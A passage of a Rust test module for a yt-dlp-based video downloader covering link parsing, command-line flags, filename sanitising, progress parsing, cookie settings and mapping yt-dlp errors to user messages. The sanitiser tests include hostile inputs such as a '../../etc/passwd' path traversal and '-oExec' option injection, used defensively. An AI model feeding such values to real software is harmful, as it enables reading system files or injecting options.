                LinkError::NotAVideoPage { site: LinkSite::Bilibili },
            ),
            ("", LinkError::Empty),
            ("   ", LinkError::Empty),
            (
                "https://www.youtube.com/watch?v=a b",
                LinkError::NotAUrl { shown: "https://www.youtube.com/watch?v=a b".into() },
            ),
        ];
        for (raw, expected) in cases {
            let got = parse(raw).map(|l| l.url().to_string());
            assert_eq!(got, Err(expected.clone()), "`{raw}`");
            // Every refusal is a sentence that tells the reader what to do next.
            let message = expected.to_string();
            assert!(message.len() > 30 && message.ends_with('.'), "`{raw}`: {message}");
            let actionable = ["Paste", "Copy", "Open", "Wait", "paste", "remove"];
            assert!(
                actionable.iter().any(|word| message.contains(word)),
                "`{raw}` is refused without saying what to do instead: {message}"
            );
        }
    }

    /// A playlist is refused *and* the refusal explains the cap, because that is the accident:
    /// one paste, two hundred videos, no way to see it happening.
    #[test]
    fn a_playlist_is_told_to_paste_individual_videos() {
        let err = parse("https://www.youtube.com/playlist?list=PL0000").unwrap_err();
        assert!(err.to_string().contains("individual"), "{err}");
        assert!(err.to_string().contains("20 at a time"), "{err}");
    }

    #[test]
    fn twenty_links_are_fine_and_twenty_one_are_refused_by_the_count() {
        assert_eq!(check_batch_size(MAX_LINKS_PER_BATCH), Ok(()));

        let err = check_batch_size(MAX_LINKS_PER_BATCH + 1).unwrap_err();
        assert_eq!(err, LinkError::TooMany { count: 21, max: 20 });
        let message = err.to_string();
        // The message names what it got, what it takes, and how many to remove.
        assert!(message.contains("21"), "{message}");
        assert!(message.contains("20"), "{message}");
        assert!(message.contains("remove 1"), "{message}");
        assert!(check_batch_size(200).unwrap_err().to_string().contains("200"));
    }

    /// The difference between a 4 MB download and a 400 MB one.
    #[test]
    fn an_audio_target_never_downloads_the_picture() {
        let link = parse("https://youtu.be/abc123").expect("a link");
        let mp3 = by_id("mp3").expect("mp3");
        let mp4 = by_id("mp4").expect("mp4");
        assert!(is_audio_only(mp3));
        assert!(!is_audio_only(mp4));

        let audio = fetch_args(
            &link,
            &FetchOptions::for_target(PathBuf::from("/tmp/job"), mp3, None, None, None),
        );
        let after_f = |args: &[String]| {
            args.iter().position(|a| a == "-f").map(|i| args[i + 1].clone()).expect("a selector")
        };
        assert_eq!(after_f(&audio), "bestaudio*/best");
        assert!(!after_f(&audio).contains("bestvideo"), "{audio:?}");

        let video = fetch_args(
            &link,
            &FetchOptions::for_target(PathBuf::from("/tmp/job"), mp4, None, None, None),
        );
        assert_eq!(after_f(&video), "bestvideo*+bestaudio/best");

        // ...and every other image/document target still wants the picture.
        for id in ["gif", "png", "webm", "mov"] {
            let target = by_id(id).expect(id);
            let args = fetch_args(
                &link,
                &FetchOptions::for_target(PathBuf::from("/tmp/j"), target, None, None, None),
            );
            assert!(after_f(&args).contains("bestvideo"), "{id}: {args:?}");
        }
    }

    /// yt-dlp needs FFmpeg to merge separate streams. We ship one; the user must not be asked to
    /// install a second copy.
    #[test]
    fn our_own_ffmpeg_is_handed_to_yt_dlp() {
        let link = parse("https://youtu.be/abc123").expect("a link");
        let sidecar = PathBuf::from("/Applications/Flint.app/Contents/MacOS/ffmpeg");
        let args = fetch_args(
            &link,
            &FetchOptions {
                ffmpeg: Some(sidecar.clone()),
                js_runtime: None,
                dir: PathBuf::from("/tmp/job"),
                audio_only: false,
                cookies: None,
            },
        );
        let at = args.iter().position(|a| a == "--ffmpeg-location").expect("--ffmpeg-location");
        assert_eq!(args[at + 1], sidecar.to_string_lossy(), "{args:?}");
        // A machine with no sidecar at all still gets a working command line - just no merging.
        let without = fetch_args(&link, &bare(Path::new("/tmp/job")));
        assert!(!without.iter().any(|a| a == "--ffmpeg-location"), "{without:?}");
    }

    /// The runtime, by absolute path, in both command lines - and cleanly absent when there is
    /// none.
    ///
    /// This is the fix for the bug the user reported: without the flag, yt-dlp looks for a runtime
    /// on the `PATH` a Finder-launched app inherited, finds none, and YouTube answers the degraded
    /// extraction with "Sign in to confirm you're not a bot".
    #[test]
    fn the_javascript_runtime_is_handed_to_yt_dlp_by_absolute_path() {
        let link = parse("https://youtu.be/abc123").expect("a link");
        let runtime = deno();
        assert_eq!(runtime.path(), Path::new("/opt/homebrew/bin/deno"));
        assert_eq!(runtime.flag_value(), "deno:/opt/homebrew/bin/deno");
        let fetch = fetch_args(
            &link,
            &FetchOptions {
                ffmpeg: None,
                js_runtime: Some(runtime.clone()),
                dir: PathBuf::from("/tmp/job"),
                audio_only: false,
                cookies: None,
            },
        );
        for args in [fetch, probe_args(&link, Some(&runtime), None)] {
            let at = args.iter().position(|a| a == "--js-runtimes").expect("--js-runtimes");
            assert_eq!(args[at + 1], "deno:/opt/homebrew/bin/deno", "{args:?}");
            // One flag, one value, and the URL is still the last argument behind its `--`.
            assert_eq!(args.iter().filter(|a| *a == "--js-runtimes").count(), 1, "{args:?}");
            assert_eq!(args.last().map(String::as_str), Some(link.url()));
            assert_eq!(args[args.len() - 2], "--", "{args:?}");
        }
        // Node is the runtime for a machine without Deno, named the way yt-dlp names it.
        let node = JsRuntime::new(Tool::Node, PathBuf::from("/usr/local/bin/node")).expect("node");
        assert_eq!(node.name(), "node");
        assert_eq!(node.flag_value(), "node:/usr/local/bin/node");
        assert_eq!(node.dir(), Some(Path::new("/usr/local/bin")));
        // ...and nothing else may be passed as a runtime, whatever its path.
        assert_eq!(JsRuntime::new(Tool::Pandoc, PathBuf::from("/opt/homebrew/bin/pandoc")), None);

        // No runtime: the flag goes entirely, rather than being passed empty or with a bare name.
        let none = fetch_args(&link, &bare(Path::new("/tmp/job")));
        for args in [none, probe_args(&link, None, None)] {
            assert!(!args.iter().any(|a| a == "--js-runtimes"), "{args:?}");
            assert!(!args.iter().any(|a| a.starts_with("deno")), "{args:?}");
            assert!(args.iter().any(|a| a == "--no-playlist"), "{args:?}");
            assert_eq!(args.last().map(String::as_str), Some(link.url()));
        }
    }

    /// The argv itself: one video, into the job's scratch, with the URL last and behind a `--`.
    #[test]
    fn the_url_is_the_last_argument_and_can_never_be_read_as_a_flag() {
        let link = parse("https://youtu.be/abc123").expect("a link");
        let dir = PathBuf::from("/tmp/flint/job-1");
        for args in [fetch_args(&link, &bare(&dir)), probe_args(&link, None, None)] {
            assert_eq!(args.last().map(String::as_str), Some(link.url()));
            assert_eq!(args[args.len() - 2], "--", "{args:?}");
            assert!(args.iter().any(|a| a == "--no-playlist"), "{args:?}");
            assert!(!link.url().starts_with('-'));
        }
        let fetch = fetch_args(&link, &bare(&dir));
        let at = fetch.iter().position(|a| a == "-o").expect("-o");
        assert_eq!(fetch[at + 1], dir.join("source.%(ext)s").to_string_lossy());
        assert!(fetch.iter().any(|a| a == "--newline"), "progress must be line based: {fetch:?}");
    }

    /// Titles are remote text: they can be empty, 300 characters, emoji, CJK, or contain a `/`
    /// that would silently make a directory.
    #[test]
    fn a_remote_title_becomes_a_filename_that_cannot_surprise_the_filesystem() {
        let emoji = sanitize_title(&"🎵".repeat(100));
        assert!(emoji.len() <= 240);
        assert!(!emoji.is_empty());
        let cases = [
            ("A normal video title", "A normal video title"),
            ("AC/DC - Thunderstruck", "AC-DC - Thunderstruck"),
            ("a/b\\c:d*e?f\"g<h>i|j", "a-b-c-d-e-f-g-h-i-j"),
            ("  spaced   out  ", "spaced out"),
            ("", "video"),
            ("...", "video"),
            ("---", "video"),
            ("-rf ~", "rf ~"),
            (".hidden", "hidden"),
            ("trailing.", "trailing"),
            ("NUL", "NUL-video"),
            ("CON.notes", "CON-video.notes"),
            ("lpt1.backup", "lpt1-video.backup"),
            ("中文标题：测试", "中文标题：测试"),
            ("🎬 emoji 🎉", "🎬 emoji 🎉"),
            ("line\nbreak", "line break"),
        ];
        for (raw, want) in cases {
            assert_eq!(sanitize_title(raw), want, "`{raw}`");
        }

        // 300 characters, and the same again in CJK (which is where a byte-length cap would bite).
        for long in [&"x".repeat(300), &"字".repeat(300)] {
            let out = sanitize_title(long);
            assert_eq!(out.chars().count(), MAX_TITLE_CHARS, "{out}");
            assert!(out.len() < 250, "a filename component must fit: {}", out.len());
        }

        // Whatever comes out is one path component, and never one a tool reads as an option.
        for raw in ["../../etc/passwd", "/absolute", "-oExec", "", "..", "🎬/🎉"] {
            let out = sanitize_title(raw);
            assert!(!out.is_empty());
            assert!(!out.starts_with('-'), "`{raw}` -> `{out}`");
            assert!(!out.contains('/') && !out.contains('\\'), "`{raw}` -> `{out}`");
            assert_eq!(Path::new(&out).components().count(), 1, "`{raw}` -> `{out}`");
        }
    }

    #[test]
    fn progress_lines_are_read_and_everything_else_is_ignored() {
        let sample = parse_download_line("[download]  42.3% of 10.00MiB at 1.20MiB/s ETA 00:07")
            .expect("a progress line");
        assert!((sample.fraction - 0.423).abs() < 0.0001, "{sample:?}");
        assert_eq!(sample.eta_secs, Some(7.0));

        assert_eq!(
            parse_download_line("[download] 100% of 10.00MiB in 00:03").map(|s| s.fraction),
            Some(1.0)
        );
        assert_eq!(
            parse_download_line("[download]   0.0% of ~ 4.00MiB at Unknown B/s ETA Unknown")
                .map(|s| (s.fraction, s.eta_secs)),
            Some((0.0, None))
        );
        assert_eq!(parse_download_line("[download] 01:02:03% junk"), None);
        for noise in [
            "[youtube] abc123: Downloading webpage",
            "[download] Destination: /tmp/job/source.f137.mp4",
            "[Merger] Merging formats into \"/tmp/job/source.mp4\"",
            "a title with 100% in it",
            "",
        ] {
            assert_eq!(parse_download_line(noise), None, "`{noise}`");
        }
    }

    /// One timestamp rule, one home. yt-dlp's `ETA 00:07` and FFmpeg's `out_time=00:00:07.00` are
    /// the same colon separated shape, and this file used to carry a second copy of the arithmetic
    /// that read them. The two agreed on every input either of them had ever been given - which is
    /// exactly what makes the duplicate dangerous: only one of them knew about `N/A`, so the next
    /// placeholder either of these tools invents would have been taught to one caller only.
    #[test]
    fn an_eta_is_read_by_the_same_clock_as_an_ffmpeg_timestamp() {
        for (raw, expected) in
            [("00:07", Some(7.0)), ("01:02:03", Some(3723.0)), ("Unknown", None), ("N/A", None)]
        {
            assert_eq!(crate::progress::parse_timestamp(raw), expected, "`{raw}`");
            let line = format!("[download]  10.0% of 4.00MiB at 1.00MiB/s ETA {raw}");
            assert_eq!(
                parse_download_line(&line).and_then(|s| s.eta_secs),
                expected,
                "the download line reads `{raw}` differently"
            );
        }
    }

    #[test]
    fn a_probe_reads_the_title_and_the_duration() {
        let info = parse_probe_output("Never Gonna Give You Up\n212\n");
        assert_eq!(info.title, "Never Gonna Give You Up");
        assert_eq!(info.duration_secs, Some(212.0));

        // An unknown duration is not a failure: the bar stays indeterminate.
        assert_eq!(parse_probe_output("Some title\nNA\n").duration_secs, None);
        assert_eq!(parse_probe_output("").title, "");
        assert_eq!(parse_probe_output("").duration_secs, None);
        // A title that looks like a number must not be mistaken for the duration.
        let numeric = parse_probe_output("2024\n99\n");
        assert_eq!((numeric.title.as_str(), numeric.duration_secs), ("2024", Some(99.0)));
        // ...and a one-line answer is a title, never a duration.
        assert_eq!(parse_probe_output("2024\n").duration_secs, None);
    }

    /// One extra line from yt-dlp must not cost the link its progress bar.
    ///
    /// `--print` implies `--quiet`, and quiet has never meant silent: a deprecation notice or an
    /// update hint on the same stdout used to shift the duration off the line the parse read, and
    /// the row converted with an indeterminate bar and no ETA for a video whose length yt-dlp had
    /// just told us.
    #[test]
    fn a_probe_survives_a_line_yt_dlp_was_not_supposed_to_print() {
        for text in [
            "Never Gonna Give You Up\nDeprecated Feature: --foo will be removed\n212\n",
            "Never Gonna Give You Up\n212\n\n",
            "Never Gonna Give You Up\n\n212",
        ] {
            let info = parse_probe_output(text);
            assert_eq!(info.title, "Never Gonna Give You Up", "{text:?}");
            assert_eq!(info.duration_secs, Some(212.0), "{text:?}");
        }
    }

    /// Real yt-dlp error text, one line each, mapped to the sentence a user gets.
    #[test]
    fn every_failure_a_user_will_actually_hit_has_its_own_sentence() {
        let cases: Vec<(&str, FetchFailure)> = vec![
            ("ERROR: [youtube] abc: Video unavailable", FetchFailure::Removed),
            (
                "ERROR: [youtube] abc: This video has been removed by the uploader",
                FetchFailure::Removed,
            ),
            (
                "ERROR: [youtube] abc: Private video. Sign in if you've been granted access to \
                 this video",
                FetchFailure::Private,
            ),
            (
                "ERROR: [youtube] abc: Sign in to confirm your age. This video may be \
                 inappropriate for some users.",
                FetchFailure::AgeRestricted,
            ),
            (
                "ERROR: [youtube] abc: The uploader has not made this video available in your \
                 country",
                FetchFailure::GeoBlocked,
            ),
            (
                "ERROR: [youtube] abc: Sign in to confirm you're not a bot. Use --cookies-from-\
                 browser",
                FetchFailure::LoginRequired,
            ),
            (
                "ERROR: unable to download webpage: <urlopen error [Errno 8] nodename nor \
                 servname provided>",
                FetchFailure::Network,
            ),
            (
                "ERROR: [youtube] abc: nsig extraction failed: Some players may not work",
                FetchFailure::Outdated,
            ),
            (
                "ERROR: [youtube] abc: Unable to extract player response; please report this \
                 issue on https://github.com/yt-dlp/yt-dlp/issues",
                FetchFailure::Outdated,
            ),
        ];
        let mut variants: Vec<String> = Vec::new();
        let mut seen: Vec<String> = Vec::new();
        // A runtime *was* discovered for every case here, which is what keeps the bot check above
        // reading as the sign-in wall it is on a machine that had one. The missing-runtime reading
        // of the same sentence has its own test below.
        let runtime = deno();
        for (stderr, want) in cases {
            let got = classify_failure(stderr, Some(&runtime), None);
            assert_eq!(got, want, "`{stderr}`");
            let message = got.to_string();
            assert!(message.len() > 20 && !message.contains("ERROR:"), "{message}");
            variants.push(format!("{got:?}"));
            seen.push(message);
        }
        // Distinct messages, not one generic error wearing nine hats: as many sentences as there
        // are kinds of failure (two of the cases are the same kind, so counts are compared after
        // both sides are deduplicated).
        variants.sort();
        variants.dedup();
        seen.sort();
        seen.dedup();
        assert_eq!(seen.len(), variants.len(), "two failures share a message: {seen:#?}");
        assert!(seen.len() >= 7, "every common failure needs its own sentence: {seen:#?}");

        // Anything unrecognised keeps yt-dlp's own last word rather than inventing one.
        let odd =
            classify_failure("ERROR: something nobody has seen before\n", Some(&runtime), None);
        assert_eq!(odd, FetchFailure::Other("ERROR: something nobody has seen before".into()));
        assert!(odd.to_string().starts_with("yt-dlp could not download"), "{odd}");
        // ...and an empty stderr still says something.
        assert!(classify_failure("", Some(&runtime), None)
            .to_string()
            .contains("no output from yt-dlp"));
    }

    /// The misdiagnosis this whole change exists to end.
    ///
    /// The strings are verbatim: the WARNING is what yt-dlp 2026.08.19 printed under
    /// `PATH=/usr/bin:/bin:/usr/sbin:/sbin` on the machine the bug was found on, and the ERROR is
    /// what YouTube answered the degraded extraction that followed it.
    #[test]
    fn a_missing_javascript_runtime_is_not_reported_as_a_sign_in_wall() {
        let warning = "WARNING: [youtube] No supported JavaScript runtime could be found. Only \
                       deno is enabled by default; to use another runtime add  --js-runtimes \
                       RUNTIME[:PATH]  to your command/config. YouTube extraction without a JS \
                       runtime has been deprecated, and some formats may be missing. See  \
                       https://github.com/yt-dlp/yt-dlp/wiki/EJS  for details on installing one";
        let bot = "ERROR: [youtube] dQw4w9WgXcQ: Sign in to confirm you're not a bot. Use \
                   --cookies-from-browser or --cookies for the authentication. See  \
                   https://github.com/yt-dlp/yt-dlp/wiki/FAQ#http-error-429-too-many-requests-or-\
                   402-payment-required  for how to manually pass cookies.";

        // yt-dlp's own warning, on its own and ahead of the failure it precedes: a missing runtime
        // either way, with or without a runtime having been passed (the flag can be there and the
        // binary still be gone by the time yt-dlp looks).
        for runtime in [None, Some(deno())] {
            let got = classify_failure(warning, runtime.as_ref(), None);
            assert_eq!(got, FetchFailure::NoJsRuntime, "the warning alone");
            let both = classify_failure(&format!("{warning}\n{bot}\n"), runtime.as_ref(), None);
            assert_eq!(both, FetchFailure::NoJsRuntime, "the warning before the failure");
        }

        // The bot check on its own, with nothing to blame but the runtime we never found.
        assert_eq!(classify_failure(bot, None, None), FetchFailure::NoJsRuntime);
        // ...and the same sentence, from a machine that *had* a runtime, is a real sign-in wall.
        assert_eq!(classify_failure(bot, Some(&deno()), None), FetchFailure::LoginRequired);

        // What each of the two says, since the point of the split is that they send the user to
        // different places: one to Settings, the other nowhere we can help with yet.
        let missing = FetchFailure::NoJsRuntime.to_string();
        assert!(missing.contains("JavaScript runtime"), "{missing}");
        assert!(missing.contains("Deno"), "names what to install: {missing}");
        assert!(!missing.to_ascii_lowercase().contains("sign in"), "{missing}");
        let login = FetchFailure::LoginRequired.to_string();
        assert!(login.contains("sign-in"), "{login}");
        assert!(!login.contains("Deno"), "{login}");
        assert_ne!(missing, login);
    }

    /// The three states the setting has, and the argv each one produces - in *both* command lines,
    /// because a members-only page refuses a probe as flatly as a download.
    #[test]
    fn each_cookie_state_produces_exactly_one_flag_in_both_command_lines() {
        let link = parse("https://youtu.be/abc123").expect("a link");
        let dir = PathBuf::from("/tmp/job");
        let cookie_flags = |args: &[String]| -> usize {
            args.iter().filter(|a| a.starts_with("--cookies")).count()
        };

        // 1. No cookies. The default, and it has to be indistinguishable from a build that has no
        //    such setting: nothing of the user's is read and nothing is even mentioned.
        assert_eq!(LinkSettings::default().effective(), None);
        for args in [fetch_args(&link, &bare(&dir)), probe_args(&link, None, None)] {
            assert_eq!(cookie_flags(&args), 0, "{args:?}");
        }

        // 2. From a named browser. The label the drawer shows is "Safari"; what reaches argv is
        //    yt-dlp's own spelling.
        let browser = LinkSettings {
            cookies: CookieSource::Browser,
            cookie_browser: "Safari".into(),
            cookie_file: None,
        };
        let flag = browser.effective().expect("safari is on the allowlist");
        let fetch = fetch_args(&link, &with_cookies(&dir, Some(flag.clone())));
        for args in [fetch, probe_args(&link, None, Some(&flag))] {
            let at = args.iter().position(|a| a == "--cookies-from-browser").expect("the flag");
            assert_eq!(args[at + 1], "safari", "{args:?}");
            assert_eq!(cookie_flags(&args), 1, "one flag, one value: {args:?}");
            assert!(!args.iter().any(|a| a == "--cookies"), "{args:?}");
            // The URL is still the last argument, behind its `--`.
            assert_eq!(args.last().map(String::as_str), Some(link.url()));
            assert_eq!(args[args.len() - 2], "--", "{args:?}");
        }

        // 3. From a cookies.txt the user exported themselves, by absolute path.
        let from_file = LinkSettings {
            cookies: CookieSource::File,
            cookie_browser: String::new(),
            cookie_file: Some(PathBuf::from("/Users/me/Downloads/cookies.txt")),
        };
        let flag = from_file.effective().expect("an absolute path");
        let fetch = fetch_args(&link, &with_cookies(&dir, Some(flag.clone())));
        for args in [fetch, probe_args(&link, None, Some(&flag))] {
            let at = args.iter().position(|a| a == "--cookies").expect("the flag");
            assert_eq!(args[at + 1], "/Users/me/Downloads/cookies.txt", "{args:?}");
            assert_eq!(cookie_flags(&args), 1, "{args:?}");
            assert!(!args.iter().any(|a| a == "--cookies-from-browser"), "{args:?}");
            assert_eq!(args.last().map(String::as_str), Some(link.url()));
            assert_eq!(args[args.len() - 2], "--", "{args:?}");
        }

        // The allowlist, seen from the argv end: a browser name the settings page would refuse
        // cannot arrive here at all, so the fetch simply carries no cookie flag rather than
        // carrying a crafted one.
        let crafted = LinkSettings {
            cookies: CookieSource::Browser,
            cookie_browser: "chrome:Profile 2".into(),
            cookie_file: None,
        };
        let args = fetch_args(&link, &with_cookies(&dir, crafted.effective()));
        assert_eq!(cookie_flags(&args), 0, "{args:?}");
        assert!(!args.iter().any(|a| a.contains("Profile")), "{args:?}");
    }

    /// The one thing that could put a cookie *value* on the stream the UI reads, pinned shut.
    ///
    /// This app streams yt-dlp's stdout and stderr into the transcript, so what matters is what
    /// yt-dlp is willing to print. Cookie values are only ever printed by its debug channel -
    /// `write_debug`, which returns immediately unless `--verbose` was passed - and its Safari jar
    /// parser is the one place that sends raw bytes out of a cookie jar down it. Neither command
    /// line asks for verbosity, and nothing about choosing a cookie source may start: a value that
    /// is never printed cannot be logged, shown or put in an error.
    #[test]
    fn no_cookie_state_ever_asks_yt_dlp_to_be_verbose() {
        let link = parse("https://youtu.be/abc123").expect("a link");
        let dir = PathBuf::from("/tmp/job");
        let sources = [
            None,
            Some(CookieFlag::Browser("safari")),
            Some(CookieFlag::Browser("chrome")),
            Some(CookieFlag::File(PathBuf::from("/Users/me/cookies.txt"))),
        ];
        for source in sources {
            let command_lines = [
                fetch_args(&link, &with_cookies(&dir, source.clone())),
                probe_args(&link, None, source.as_ref()),
            ];
            for args in command_lines {
                for arg in &args {
                    assert!(
                        !matches!(
                            arg.as_str(),
                            "-v" | "--verbose" | "--print-traffic" | "--dump-pages"
                        ),
                        "verbosity would let a cookie value reach the transcript: {args:?}"
                    );
                }
            }
        }
    }

    /// The sign-in wall, and the whole point of splitting it: the advice has to change once the
    /// user has already taken it.
    #[test]
    fn a_sign_in_wall_says_something_different_once_a_cookie_source_is_configured() {
        let wall = "ERROR: [youtube] abc: Sign in to confirm you're not a bot. Use \
                    --cookies-from-browser or --cookies for the authentication.";
        let runtime = deno();

        // Nothing configured: name the setting that now exists, and promise nothing.
        let without = classify_failure(wall, Some(&runtime), None);
        assert_eq!(without, FetchFailure::LoginRequired);
        let advice = without.to_string();
        assert!(advice.contains("Settings → Links"), "{advice}");
        assert!(advice.contains("cookies.txt"), "{advice}");
        assert!(!advice.contains("planned"), "the promise is kept, not repeated: {advice}");
        assert!(!advice.contains("cannot do for you"), "{advice}");

        // Already configured: the sentence above would be telling them to do what they did.
        for source in [
            CookieFlag::Browser("firefox"),
            CookieFlag::File(PathBuf::from("/Users/me/cookies.txt")),
        ] {
            let with = classify_failure(wall, Some(&runtime), Some(&source));
            assert_eq!(with, FetchFailure::CookiesNotAccepted, "{source:?}");
            let stale = with.to_string();
            assert_ne!(stale, advice, "{source:?}");
            assert!(stale.contains("expired"), "it says what is most likely wrong: {stale}");
            assert!(
                !stale.contains("Settings → Links"),
                "do not send them back where they have already been: {stale}"
            );
            // Neither message may echo the source itself - not the browser it was told to read,
            // not the path it was given, and certainly nothing out of either.
            assert!(!stale.contains("firefox") && !stale.contains("/Users/me"), "{stale}");
        }

        // A members-only upload is the same wall by another name, and splits the same way.
        let members = "ERROR: [youtube] abc: Join this channel to get access to members-only \
                       content";
        assert_eq!(classify_failure(members, Some(&runtime), None), FetchFailure::LoginRequired);
        assert_eq!(
            classify_failure(members, Some(&runtime), Some(&CookieFlag::Browser("chrome"))),
            FetchFailure::CookiesNotAccepted
        );
    }

    /// Safari permission failures require Full Disk Access guidance, not another sign-in.
    #[test]
    fn safaris_cookie_jar_is_reported_as_full_disk_access_and_not_as_a_sign_in() {
        let measured = "ERROR: [Errno 1] Operation not permitted: \
                        '/Users/test-user/Library/Containers/com.apple.Safari/Data/Library/Cookies/\
                        Cookies.binarycookies'";
        let safari = CookieFlag::Browser("safari");
        let got = classify_failure(measured, Some(&deno()), Some(&safari));
        assert_eq!(got, FetchFailure::SafariNeedsFullDiskAccess);

        let message = got.to_string();
        assert!(message.contains("Full Disk Access"), "name the permission: {message}");
        assert!(message.contains("Safari"), "name the browser: {message}");
        assert!(message.contains("easier"), "another browser is the easier route: {message}");
        assert!(message.contains("Settings → Links"), "say where to switch it: {message}");
        // Permission changes require a restart; ad-hoc rebuilds can invalidate the grant.
        assert!(
            message.contains("quit Flint and open it again"),
            "a granted permission only reaches a relaunched app: {message}"
        );
        assert!(
            message.contains("built yourself loses the grant every time it is rebuilt"),
            "a rebuilt local copy is a different signature to TCC: {message}"
        );
        // Said in the app's own voice, with none of the machinery named.
        for jargon in ["TCC", "code signature", "adhoc", "ad-hoc", "entitlement", "signature"] {
            assert!(!message.contains(jargon), "`{jargon}` is not a user's word: {message}");
        }
        // ...and none of yt-dlp's own words survive into it.
        assert!(!message.contains("Errno") && !message.contains("binarycookies"), "{message}");

        // The other way the same missing permission shows up: the container path does not even stat.
        assert_eq!(
            classify_failure(
                "ERROR: could not find safari cookies database",
                Some(&deno()),
                Some(&safari)
            ),
            FetchFailure::SafariNeedsFullDiskAccess
        );
        // The jar is the cause and the site's answer is only the consequence, so the jar wins.
        let and_then_the_wall =
            format!("{measured}\nERROR: [youtube] abc: Sign in to confirm you're not a bot.");
        assert_eq!(
            classify_failure(&and_then_the_wall, Some(&deno()), Some(&safari)),
            FetchFailure::SafariNeedsFullDiskAccess
        );
        // Nothing that is not about that file reaches this branch.
        assert_ne!(
            classify_failure(
                "ERROR: [youtube] abc: Sign in to confirm you're not a bot.",
                Some(&deno()),
                Some(&CookieFlag::Browser("chrome"))
            ),
            FetchFailure::SafariNeedsFullDiskAccess
        );
    }

    /// The Chrome-family equivalent, which *is* distinguishable in stderr.
    ///
    /// Those browsers encrypt their cookies with a key macOS keeps in the login Keychain, and
    /// reading it raises a system prompt. yt-dlp asks with `security find-generic-password`; a
    /// prompt that is refused or dismissed makes it warn and then carry on with a jar it cannot
    /// decrypt, which the site sees as no sign-in at all. Without this branch that lands on the
    /// stale-cookies message and sends the user to check an account that is perfectly fine.
    #[test]
    fn a_refused_keychain_prompt_is_not_reported_as_a_stale_sign_in() {
        let chrome = CookieFlag::Browser("chrome");
        let refused = "WARNING: find-generic-password failed\nWARNING: Extracted 0 cookies from \
                       chrome (312 could not be decrypted)\nERROR: [youtube] abc: Sign in to \
                       confirm you're not a bot.";
        let got = classify_failure(refused, Some(&deno()), Some(&chrome));
        assert_eq!(got, FetchFailure::BrowserKeychainRefused);

        let message = got.to_string();
        assert!(message.contains("Keychain"), "{message}");
        assert!(message.contains("cookies.txt"), "names the way round it: {message}");
        assert!(!message.contains("find-generic-password"), "no tool internals: {message}");
        assert_ne!(message, FetchFailure::CookiesNotAccepted.to_string());

        // Without that warning, the same wall is the ordinary stale-cookies answer again.
        assert_eq!(
            classify_failure(
                "ERROR: [youtube] abc: Sign in to confirm you're not a bot.",
                Some(&deno()),
                Some(&chrome)
            ),
            FetchFailure::CookiesNotAccepted
        );
    }

    /// The split this change is really about: a jar that never opened is not an expired sign-in.
    ///
    /// Both of these used to land on [`FetchFailure::CookiesNotAccepted`], which told the user
    /// their session had gone stale and sent them to sign in again - in a browser whose cookies
    /// this app had not managed to read at all. Signing in a second time changes nothing about a
    /// database that is not there or a cookies.txt that is not one.
    #[test]
    fn a_cookie_source_that_never_opened_is_not_called_an_expired_sign_in() {
        let runtime = deno();
        let chrome = CookieFlag::Browser("chrome");
        let file = CookieFlag::File(PathBuf::from("/Users/me/Downloads/cookies.txt"));

        // Measured with yt-dlp 2026.08.19 against a browser that is not installed. The wall comes
        // after it, because a fetch with no usable cookies is a fetch with no cookies.
        let missing_db = "ERROR: could not find chrome cookies database in \
                          \"/Users/me/Library/Application Support/Google/Chrome\"\nERROR: \
                          [youtube] abc: Sign in to confirm you're not a bot.";
        let got = classify_failure(missing_db, Some(&runtime), Some(&chrome));
        assert_eq!(got, FetchFailure::BrowserCookiesUnreadable);
        let message = got.to_string();
        assert!(message.contains("could not read the sign-in"), "{message}");
        assert!(message.contains("no sign-in at all"), "say what the site was sent: {message}");
        assert_ne!(message, FetchFailure::CookiesNotAccepted.to_string());
        assert!(!message.contains("expired"), "nothing is known to have expired: {message}");
        // Not the browser it was told to read, not a path, not a word of yt-dlp's.
        assert!(!message.contains("chrome") && !message.contains("Library"), "{message}");
        assert!(!message.contains("database"), "{message}");

        // Measured with a file that is not a cookie jar, and with a folder chosen instead of one.
        for stderr in [
            "ERROR: '/Users/me/Downloads/cookies.txt' does not look like a Netscape format \
             cookies file",
            "ERROR: unable to open cookie file: [Errno 21] Is a directory: '/Users/me/Downloads'",
        ] {
            let got = classify_failure(stderr, Some(&runtime), Some(&file));
            assert_eq!(got, FetchFailure::CookiesFileUnreadable, "{stderr}");
            let message = got.to_string();
            assert!(message.contains("cookies.txt"), "{message}");
            assert!(message.contains("Settings → Links"), "say where to choose again: {message}");
            assert!(!message.contains("/Users/me") && !message.contains("Netscape"), "{message}");
        }

        // Each kind of source only answers for its own kind of failure, so a file problem never
        // tells somebody to check a browser and a browser problem never blames their export.
        assert_eq!(
            classify_failure(missing_db, Some(&runtime), Some(&file)),
            FetchFailure::CookiesNotAccepted,
            "a browser's database is not a cookies.txt problem"
        );
        // With no source configured there is no jar to have failed: the wall keeps its own words.
        assert_eq!(classify_failure(missing_db, Some(&runtime), None), FetchFailure::LoginRequired);

        // The two macOS permission cases are more specific and stay ahead of the generic one -
        // "turn on Full Disk Access" is a thing the user can do, "could not read it" is not.
        let safari = CookieFlag::Browser("safari");
        assert_eq!(
            classify_failure("ERROR: could not find safari cookies database", None, Some(&safari)),
            FetchFailure::SafariNeedsFullDiskAccess
        );
        let keychain = "WARNING: find-generic-password failed\nERROR: could not decrypt chrome \
                        cookies database";
        assert_eq!(
            classify_failure(keychain, Some(&runtime), Some(&chrome)),
            FetchFailure::BrowserKeychainRefused
        );

        // ...and all four are the same answer to the one question a recovery flow asks.
        for unreadable in [
            FetchFailure::BrowserCookiesUnreadable,
            FetchFailure::CookiesFileUnreadable,
            FetchFailure::SafariNeedsFullDiskAccess,
            FetchFailure::BrowserKeychainRefused,
        ] {
            assert!(unreadable.is_unreadable_cookie_source(), "{unreadable:?}");
        }
        for read_or_irrelevant in [
            FetchFailure::CookiesNotAccepted,
            FetchFailure::LoginRequired,
            FetchFailure::NoJsRuntime,
            FetchFailure::Private,
            FetchFailure::Other("something else".into()),
        ] {
            assert!(!read_or_irrelevant.is_unreadable_cookie_source(), "{read_or_irrelevant:?}");
        }
    }

    /// The sign-in check, end to end as the frontend will read it: three verdicts a user can act
    /// on, one that admits it learned nothing, and the failure's own words throughout.
    #[test]
    fn the_sign_in_check_answers_in_the_words_a_failed_row_would_have_used() {
        assert_eq!(CookieProbe::Worked.verdict(), CookieCheck::Working);
        assert!(CookieCheck::Working.ok());
        assert_eq!(CookieProbe::Worked.message(), COOKIE_TEST_WORKS);
        assert!(!COOKIE_TEST_WORKS.contains("will work"), "one page is not every video");

        // Read, and refused. Both spellings of the wall mean the same thing to a check that was
        // given a source: the site saw cookies and was not satisfied.
